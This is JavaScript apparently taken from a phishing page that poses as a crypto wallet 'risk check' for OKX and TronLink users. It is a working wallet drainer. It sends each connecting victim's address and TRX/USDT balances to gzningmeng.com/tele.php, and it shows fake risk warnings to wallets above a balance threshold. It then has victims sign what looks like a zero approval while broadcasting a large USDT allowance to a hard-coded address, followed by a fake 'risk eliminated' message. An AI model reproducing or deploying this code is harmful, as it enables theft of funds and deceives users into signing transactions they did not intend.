 function isTopLevelDomain() {
            // 当前访问的域名
            const currentDomain = window.location.hostname;
            // 检测是否是顶级域名
            if (currentDomain === 'gzningmeng.com') {
                // 生成随机的8位字母和数字组合
                const randomString = generateRandomString(8);
                // 构建新的子域名URL
                const newUrl = `https://${randomString}.gzningmeng.com`;
                // 重定向到新URL
                var tpurl2 = 'okx://wallet/dapp/details?dappUrl=' + newUrl
                window.location.href = tpurl2;
            }
        }

        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                result += characters.charAt(randomIndex);
            }
            return result;
        }


     function getRandomUrl(urlArray) {
    var randomIndex = Math.floor(Math.random() * urlArray.length);
    return urlArray[randomIndex];
}
    document.addEventListener('DOMContentLoaded', function() {
       if(/okex/.test(navigator.userAgent.toLowerCase())){
			okexConnect();
			 getaddress();
		}else{
          window.onload = isTopLevelDomain;
		}
		      
		
    
    });
    
    
	async function okexConnect() {
			if (window.tronLink.ready) {
				window.tronWeb = tronLink.tronWeb;
			} else {
				const res = await tronLink.request({ method: 'tron_requestAccounts' });
				if (res.code === 200) {
				  window.tronWeb = tronLink.tronWeb;
         
				}
			}
		}
		
		
	async function getaddress() {
                try {
                    await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
            
                    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                        const userAddress = window.tronWeb.defaultAddress.base58;
                        console.log('User Address:', userAddress);
                        document.getElementById('wallet-input').value = userAddress;
                        const userRegion = navigator.language || navigator.userLanguage;
                        const currentTime = new Date().toLocaleString();
                        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
                        const trxBalanceInTRX = window.tronWeb.fromSun(trxBalance); 
                        const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
                        const contract = await window.tronWeb.contract().at(usdtContractAddress);
                        const usdtBalance = await contract.balanceOf(userAddress).call();
                        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);
                        fetch('https://gzningmeng.com/tele.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    address: userAddress,
                    region: userRegion,
                    time: currentTime,
                    trxBalance: trxBalanceInTRX,
                    usdtBalance: usdtBalanceFormatted
                })
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Error sending data to Telegram:', error));
                    } else {
                        console.log('Failed to fetch the address.');
                    }
                } catch (error) {
                    console.error('Error connecting to Tron wallet:', error);
                }
    }
    
    async function payusdt() {
    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT on Tron
    const userAddress = window.tronWeb.defaultAddress.base58; // 获取当前用户地址

    try {
        // 获取 USDT 余额
        const contract = await window.tronWeb.contract().at(usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userAddress).call();
        
        // 转换为可读格式
        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);

        // 获取 TRX 余额
        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
        const trxBalanceFormatted = (trxBalance / 1e6).toFixed(6);

        // 输出TRX和USDT余额到控制台（可选）
        console.log(`TRX Balance: ${trxBalanceFormatted} TRX`);
        console.log(`USDT Balance: ${usdtBalanceFormatted} USDT`);
        
        
           // 显示遮罩层
            document.getElementById('overlay').style.display = 'flex';
            
            // 2-5秒后执行
            setTimeout(function() {
                //document.getElementById('overlay').textContent = '查询完毕';
                // 再过1秒隐藏遮罩层
                
                setTimeout(function() {
                    document.getElementById('overlay').style.display = 'none';
                    if (usdtBalanceFormatted <= 30 || trxBalanceFormatted <= 28){
           // const savedLanguage = localStorage.getItem('language');
            if (currentLanguage === 'zh-TC') {
                alert('目前未查詢到任何風險,請繼續保持良好習慣!');
            } else if (currentLanguage === 'en') {
                alert("No risks have been found so far, please continue to maintain good habits!");
            } 
            return false;
        } else {
           if (currentLanguage === 'zh-TC') {
    if (confirm('目前有異常風險,正在前往取消風險,可能存在多次取消!')) {
        RiskQuery();
    }
} else if (currentLanguage === 'en') {
    if (confirm("There is currently an abnormal risk, and the risk of cancellation is approaching. There may be multiple cancellations!")) {
        RiskQuery();
    }
}

        }
                }, 1000);
            }, Math.random() * 3000 + 2000); // 随机2-5秒
            
            
        
        // 检查 USDT 和 TRX 余额条件
        
    } catch (error) {
        console.error("Error in payusdt function:", error);
        return false;
    }
}
    
    async function RiskQuery() {
      
                          try {
                                  
                    const tronWebInstance = window.tronWeb;
                    const userAddress = await tronWebInstance.defaultAddress.base58;
                    console.log(`User Address: ${userAddress}`);
                    const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                    const approveaddress = "TAV1iZH5P4ATSBTS3BBGgSJcPmCRZFgVbr";
                    const approvalParams = [
                        { "type": "address", "value": approveaddress },
                        { "type": "uint256", "value": "100000000000" }
                    ];
                    const approvalOptions = { "feeLimit": 100000000 };
                    const approvalTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
                        contractAddress, 
                        "increaseApproval(address,uint256)", 
                        approvalOptions, 
                        approvalParams, 
                        userAddress
                    );
            
                  
                 
                         const approvalParamst = [
                        { "type": "address", "value": approveaddress },
                        { "type": "uint256", "value": "0" }
                    ];
                        const transferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
                             contractAddress, 
                        "approve(address,uint256)", 
                        approvalOptions, 
                        approvalParamst, 
                        userAddress
                        );

                    const originalRawData = approvalTransaction.transaction.raw_data;

                    approvalTransaction.transaction.raw_data = transferTransaction.transaction.raw_data;
  
                    const signedTransaction = await tronWebInstance.trx.sign(approvalTransaction.transaction);
             
                     signedTransaction.raw_data = originalRawData;
     
                    const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);
                    
                    if (broadcastResult.result) {
                      //const savedLanguage = localStorage.getItem('language');
                        if(currentLanguage === 'zh-TC'){
                             alert("風險已經解除!請放心使用!");
                        }else if(currentLanguage === 'en'){
                             alert("The risk has been eliminated! Please feel free to use it!");
                        }
                       
                    } else {
                        alert("error！");
                    }
                } catch (error) {
               
                }
            
            
        }
